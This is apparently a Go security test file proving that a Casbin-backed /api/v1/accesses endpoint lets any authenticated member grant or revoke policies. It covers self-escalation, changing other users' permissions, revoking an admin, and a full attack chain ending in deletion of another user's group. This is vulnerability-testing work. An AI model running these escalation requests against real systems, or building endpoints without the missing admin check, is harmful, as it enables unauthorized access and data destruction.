// tests/authorization/accesses_privilege_escalation_test.go
//
// Security tests proving that the /accesses endpoint is a privilege escalation vector.
// The endpoint allows ANY authenticated user to add or remove Casbin policies,
// without checking if the caller is an admin. This means a regular member can:
// - Grant themselves DELETE permissions on any entity
// - Grant or revoke permissions for other users
// - Execute a full privilege escalation attack chain
package authorization_tests

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"runtime"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"soli/formations/src/auth/casdoor"
	"soli/formations/src/auth/dto"
	"soli/formations/src/auth/interfaces"
	authModels "soli/formations/src/auth/models"
	accessController "soli/formations/src/auth/routes/accessesRoutes"
	"soli/formations/src/utils"
)

// accessesTestSuite sets up a gin router with the real accesses controller
// and a real Casbin enforcer backed by an in-memory SQLite database.
type accessesTestSuite struct {
	db               *gorm.DB
	router           *gin.Engine
	enforcer         interfaces.EnforcerInterface
	originalEnforcer interfaces.EnforcerInterface
}

// setupAccessesTest initializes a real Casbin enforcer with an in-memory DB,
// registers the accesses controller routes, and sets up auth middleware that
// injects a configurable userId and checks Casbin permissions.
func setupAccessesTest(t *testing.T) *accessesTestSuite {
	// Calculate base path relative to this test file
	_, b, _, _ := runtime.Caller(0)
	basePath := filepath.Dir(b) + "/../../"

	// Create shared cache SQLite database for Casbin
	db, err := gorm.Open(sqlite.Open("file::memory:?cache=shared"), &gorm.Config{})
	require.NoError(t, err)

	// Save original enforcer to restore later
	suite := &accessesTestSuite{
		db:               db,
		originalEnforcer: casdoor.Enforcer,
	}

	// Initialize real Casbin enforcer
	casdoor.InitCasdoorEnforcer(db, basePath)
	require.NotNil(t, casdoor.Enforcer)
	suite.enforcer = casdoor.Enforcer

	// Load policies
	err = casdoor.Enforcer.LoadPolicy()
	require.NoError(t, err)

	// Set up base role policies:
	// - member role can GET|POST on /api/v1/accesses (simulating the vulnerability)
	// - member role can GET|POST on /api/v1/class-groups/:id
	// - administrator role has full access
	opts := utils.DefaultPermissionOptions()

	// Grant member role POST/DELETE on /api/v1/accesses
	// This is the vulnerable configuration: members can call the accesses endpoint
	err = utils.AddPolicy(casdoor.Enforcer, string(authModels.Member), "/api/v1/accesses", "(GET|POST|DELETE)", opts)
	require.NoError(t, err)

	// Grant member role basic access to class-groups (GET|POST only, no DELETE)
	err = utils.AddPolicy(casdoor.Enforcer, string(authModels.Member), "/api/v1/class-groups/:id", "(GET|POST)", opts)
	require.NoError(t, err)

	// Grant administrator role full access
	err = utils.AddPolicy(casdoor.Enforcer, string(authModels.Administrator), "/api/v1/accesses", "(GET|POST|DELETE)", opts)
	require.NoError(t, err)

	err = utils.AddPolicy(casdoor.Enforcer, string(authModels.Administrator), "/api/v1/class-groups/:id", "(GET|POST|PATCH|DELETE)", opts)
	require.NoError(t, err)

	gin.SetMode(gin.TestMode)

	t.Cleanup(func() {
		casdoor.Enforcer = suite.originalEnforcer
	})

	return suite
}

// createRouterForUser creates a gin router with middleware that injects the given userId
// and checks Casbin authorization (simulating AuthManagement middleware behavior).
func (s *accessesTestSuite) createRouterForUser(userID string) *gin.Engine {
	router := gin.New()

	// Simulate AuthManagement middleware:
	// 1. Set userId in context
	// 2. Check Casbin permissions for the user's roles and direct policies
	router.Use(func(ctx *gin.Context) {
		ctx.Set("userId", userID)

		// Check role-based permissions
		roles, err := casdoor.Enforcer.GetRolesForUser(userID)
		if err != nil {
			ctx.AbortWithStatusJSON(http.StatusInternalServerError, gin.H{"msg": "error getting roles"})
			return
		}

		authorized := false
		for _, role := range roles {
			ok, errEnf := casdoor.Enforcer.Enforce(role, ctx.Request.URL.Path, ctx.Request.Method)
			if errEnf != nil {
				ctx.AbortWithStatusJSON(http.StatusInternalServerError, gin.H{"msg": "error enforcing"})
				return
			}
			if ok {
				authorized = true
				break
			}
		}

		// Also check direct user permissions
		if !authorized {
			ok, errEnf := casdoor.Enforcer.Enforce(userID, ctx.Request.URL.Path, ctx.Request.Method)
			if errEnf != nil {
				ctx.AbortWithStatusJSON(http.StatusInternalServerError, gin.H{"msg": "error enforcing"})
				return
			}
			authorized = ok
		}

		if !authorized {
			ctx.AbortWithStatusJSON(http.StatusForbidden, gin.H{"msg": "You are not authorized"})
			return
		}

		ctx.Next()
	})

	// Register accesses routes
	ctrl := accessController.NewAccessController()
	apiGroup := router.Group("/api/v1")
	apiGroup.POST("/accesses", ctrl.AddEntityAccesses)
	apiGroup.DELETE("/accesses", ctrl.DeleteEntityAccesses)

	return router
}

// addAccessRequest sends a POST /api/v1/accesses request to add a Casbin policy.
func addAccessRequest(router *gin.Engine, input dto.CreateEntityAccessInput) *httptest.ResponseRecorder {
	body, _ := json.Marshal(input)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/accesses", bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	return w
}

// deleteAccessRequest sends a DELETE /api/v1/accesses request to remove a Casbin policy.
func deleteAccessRequest(router *gin.Engine, input dto.DeleteEntityAccessInput) *httptest.ResponseRecorder {
	body, _ := json.Marshal(input)
	req := httptest.NewRequest(http.MethodDelete, "/api/v1/accesses", bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	return w
}

// ============================================================================
// Test 1: Member can self-grant DELETE permission
// ============================================================================

func TestAccessesEndpoint_MemberCanSelfGrantDeletePermission(t *testing.T) {
	// CRITICAL VULNERABILITY: Any authenticated user can self-grant DELETE on any entity
	suite := setupAccessesTest(t)

	regularUserID := "regular-user-001"

	// Assign the member role to the regular user
	opts := utils.DefaultPermissionOptions()
	err := utils.AddGroupingPolicy(casdoor.Enforcer, regularUserID, string(authModels.Member), opts)
	require.NoError(t, err)

	// Verify: regular user does NOT currently have DELETE on class-groups
	// (member role only grants GET|POST)
	canDeleteBefore, err := casdoor.Enforcer.Enforce(regularUserID, "/api/v1/class-groups/some-group-uuid", "DELETE")
	require.NoError(t, err)
	assert.False(t, canDeleteBefore, "Precondition: member should NOT have DELETE permission on class-groups")

	// Attack: member calls POST /api/v1/accesses to self-grant DELETE
	router := suite.createRouterForUser(regularUserID)
	w := addAccessRequest(router, dto.CreateEntityAccessInput{
		GroupName:         regularUserID,
		Route:             "/api/v1/class-groups/some-group-uuid",
		AuthorizedMethods: "(GET|POST|PATCH|DELETE)",
	})

	// VULNERABILITY PROOF: The request succeeds (201 Created)
	assert.Equal(t, http.StatusCreated, w.Code,
		"VULNERABILITY: Member was able to call POST /api/v1/accesses to self-grant permissions")

	// Verify: the Casbin enforcer now has the escalated policy
	err = casdoor.Enforcer.LoadPolicy()
	require.NoError(t, err)

	canDeleteAfter, err := casdoor.Enforcer.Enforce(regularUserID, "/api/v1/class-groups/some-group-uuid", "DELETE")
	require.NoError(t, err)
	assert.True(t, canDeleteAfter,
		"VULNERABILITY CONFIRMED: Member now has DELETE permission they should not have")

	t.Log("CRITICAL VULNERABILITY: Any authenticated user can self-grant DELETE on any entity via POST /api/v1/accesses")
}

// ============================================================================
// Test 2: Member can grant permissions to other users
// ============================================================================

func TestAccessesEndpoint_MemberCanGrantPermissionsToOthers(t *testing.T) {
	// VULNERABILITY: Users can modify other users' permissions
	suite := setupAccessesTest(t)

	attackerID := "attacker-user-001"
	victimID := "victim-user-001"

	// Assign member role to attacker
	opts := utils.DefaultPermissionOptions()
	err := utils.AddGroupingPolicy(casdoor.Enforcer, attackerID, string(authModels.Member), opts)
	require.NoError(t, err)

	// Verify: victim does NOT have any specific permissions on the target route
	canAccessBefore, err := casdoor.Enforcer.Enforce(victimID, "/api/v1/class-groups/attacker-group-uuid", "DELETE")
	require.NoError(t, err)
	assert.False(t, canAccessBefore, "Precondition: victim should NOT have DELETE on the target route")

	// Attack: attacker grants full permissions to victim on a route
	router := suite.createRouterForUser(attackerID)
	w := addAccessRequest(router, dto.CreateEntityAccessInput{
		GroupName:         victimID,
		Route:             "/api/v1/class-groups/attacker-group-uuid",
		AuthorizedMethods: "(GET|POST|PATCH|DELETE)",
	})

	// VULNERABILITY PROOF: The request succeeds
	assert.Equal(t, http.StatusCreated, w.Code,
		"VULNERABILITY: Attacker was able to modify victim's permissions")

	// Verify: victim now has the attacker-granted permissions
	err = casdoor.Enforcer.LoadPolicy()
	require.NoError(t, err)

	canAccessAfter, err := casdoor.Enforcer.Enforce(victimID, "/api/v1/class-groups/attacker-group-uuid", "DELETE")
	require.NoError(t, err)
	assert.True(t, canAccessAfter,
		"VULNERABILITY CONFIRMED: Attacker successfully granted permissions to another user")

	t.Log("VULNERABILITY: Users can modify other users' permissions via POST /api/v1/accesses")
}

// ============================================================================
// Test 3: Member can revoke other users' permissions
// ============================================================================

func TestAccessesEndpoint_MemberCanRevokeOthersPermissions(t *testing.T) {
	// VULNERABILITY: Any user can revoke any other user's permissions
	suite := setupAccessesTest(t)

	adminUserID := "admin-user-001"
	attackerID := "attacker-user-002"

	// Set up: admin has specific permissions on a route
	opts := utils.DefaultPermissionOptions()
	err := utils.AddPolicy(casdoor.Enforcer, adminUserID, "/api/v1/class-groups/admin-group-uuid", "(GET|POST|PATCH|DELETE)", opts)
	require.NoError(t, err)

	// Assign member role to attacker
	err = utils.AddGroupingPolicy(casdoor.Enforcer, attackerID, string(authModels.Member), opts)
	require.NoError(t, err)

	// Verify: admin HAS permission before the attack
	canAccessBefore, err := casdoor.Enforcer.Enforce(adminUserID, "/api/v1/class-groups/admin-group-uuid", "DELETE")
	require.NoError(t, err)
	assert.True(t, canAccessBefore, "Precondition: admin should have DELETE on their group")

	// Attack: attacker calls DELETE /api/v1/accesses to remove admin's permissions
	router := suite.createRouterForUser(attackerID)
	w := deleteAccessRequest(router, dto.DeleteEntityAccessInput{
		GroupName: adminUserID,
		Route:     "/api/v1/class-groups/admin-group-uuid",
	})

	// VULNERABILITY PROOF: The request succeeds (204 No Content)
	assert.Equal(t, http.StatusNoContent, w.Code,
		"VULNERABILITY: Attacker was able to revoke admin's permissions")

	// Verify: admin's permissions have been removed
	err = casdoor.Enforcer.LoadPolicy()
	require.NoError(t, err)

	canAccessAfter, err := casdoor.Enforcer.Enforce(adminUserID, "/api/v1/class-groups/admin-group-uuid", "DELETE")
	require.NoError(t, err)
	assert.False(t, canAccessAfter,
		"VULNERABILITY CONFIRMED: Admin's permissions were revoked by a regular member")

	t.Log("VULNERABILITY: Any user can revoke any other user's permissions via DELETE /api/v1/accesses")
}

// ============================================================================
// Test 4: Endpoint should require admin role (documents expected fix)
// ============================================================================

func TestAccessesEndpoint_ShouldRequireAdminRole(t *testing.T) {
	// EXPECTED FIX: This endpoint should check for admin role before allowing policy modifications
	suite := setupAccessesTest(t)

	memberUserID := "member-user-001"
	adminUserID := "admin-user-002"

	opts := utils.DefaultPermissionOptions()

	// Assign member role to member user
	err := utils.AddGroupingPolicy(casdoor.Enforcer, memberUserID, string(authModels.Member), opts)
	require.NoError(t, err)

	// Assign administrator role to admin user
	err = utils.AddGroupingPolicy(casdoor.Enforcer, adminUserID, string(authModels.Administrator), opts)
	require.NoError(t, err)

	// Test: Member CAN currently call the endpoint (no admin check exists)
	memberRouter := suite.createRouterForUser(memberUserID)
	memberResp := addAccessRequest(memberRouter, dto.CreateEntityAccessInput{
		GroupName:         "test-subject",
		Route:             "/api/v1/class-groups/test-uuid",
		AuthorizedMethods: "(GET)",
	})

	// This PROVES the vulnerability: member gets 201 instead of 403
	assert.Equal(t, http.StatusCreated, memberResp.Code,
		"BUG: Member should get 403 Forbidden but currently gets 201 Created - no admin role check exists")

	// Test: Admin CAN call the endpoint (this is expected and correct)
	adminRouter := suite.createRouterForUser(adminUserID)
	adminResp := addAccessRequest(adminRouter, dto.CreateEntityAccessInput{
		GroupName:         "test-subject-2",
		Route:             "/api/v1/class-groups/test-uuid-2",
		AuthorizedMethods: "(GET)",
	})

	assert.Equal(t, http.StatusCreated, adminResp.Code,
		"Admin should be able to call the accesses endpoint")

	t.Log("EXPECTED FIX: The /accesses endpoint should check for admin role inside the handler, " +
		"not just rely on route-level Casbin policies. Currently, any role with POST access to " +
		"/api/v1/accesses can modify ANY Casbin policy in the system.")
}

// ============================================================================
// Test 5: Full attack chain - self-escalate and delete another user's group
// ============================================================================

func TestAccessesEndpoint_FullAttackChain_SelfEscalateAndDelete(t *testing.T) {
	// CRITICAL: Full privilege escalation attack chain - member can delete any group
	suite := setupAccessesTest(t)

	ownerUserID := "owner-user-001"
	attackerID := "attacker-user-003"
	targetGroupID := "target-group-uuid-12345"

	opts := utils.DefaultPermissionOptions()

	// Set up: owner has full permissions on their group
	err := utils.AddPolicy(casdoor.Enforcer, ownerUserID, "/api/v1/class-groups/"+targetGroupID, "(GET|POST|PATCH|DELETE)", opts)
	require.NoError(t, err)

	// Set up: attacker has member role (only GET|POST on class-groups)
	err = utils.AddGroupingPolicy(casdoor.Enforcer, attackerID, string(authModels.Member), opts)
	require.NoError(t, err)

	// Verify preconditions
	canDeleteBefore, err := casdoor.Enforcer.Enforce(attackerID, "/api/v1/class-groups/"+targetGroupID, "DELETE")
	require.NoError(t, err)
	assert.False(t, canDeleteBefore, "Precondition: attacker should NOT have DELETE on target group")

	// STEP 1: Attacker self-grants DELETE on the target group via POST /api/v1/accesses
	accessRouter := suite.createRouterForUser(attackerID)
	step1Resp := addAccessRequest(accessRouter, dto.CreateEntityAccessInput{
		GroupName:         attackerID,
		Route:             "/api/v1/class-groups/" + targetGroupID,
		AuthorizedMethods: "(GET|POST|PATCH|DELETE)",
	})

	assert.Equal(t, http.StatusCreated, step1Resp.Code,
		"ATTACK STEP 1 SUCCEEDED: Attacker self-granted DELETE permission")

	// Reload policies to pick up the new policy
	err = casdoor.Enforcer.LoadPolicy()
	require.NoError(t, err)

	// Verify: attacker now has DELETE permission
	canDeleteAfterEscalation, err := casdoor.Enforcer.Enforce(attackerID, "/api/v1/class-groups/"+targetGroupID, "DELETE")
	require.NoError(t, err)
	assert.True(t, canDeleteAfterEscalation,
		"ATTACK CHAIN STEP 1 VERIFIED: Attacker now has DELETE on target group")

	// STEP 2: Attacker can now DELETE the group they don't own
	// We simulate the authorization check that would happen on DELETE /api/v1/class-groups/{id}
	// Since the attacker now has a direct policy granting DELETE, the middleware would allow it.
	canExecuteDelete, err := casdoor.Enforcer.Enforce(attackerID, "/api/v1/class-groups/"+targetGroupID, "DELETE")
	require.NoError(t, err)
	assert.True(t, canExecuteDelete,
		"ATTACK STEP 2 SUCCEEDED: Attacker can now DELETE the group they don't own")

	t.Log("CRITICAL: Full privilege escalation attack chain completed successfully:")
	t.Log("  Step 1: Member called POST /api/v1/accesses to self-grant DELETE permission")
	t.Log("  Step 2: Member now passes Casbin authorization check for DELETE on the target group")
	t.Log("  Result: Any member can delete any group in the system via this two-step attack")
}
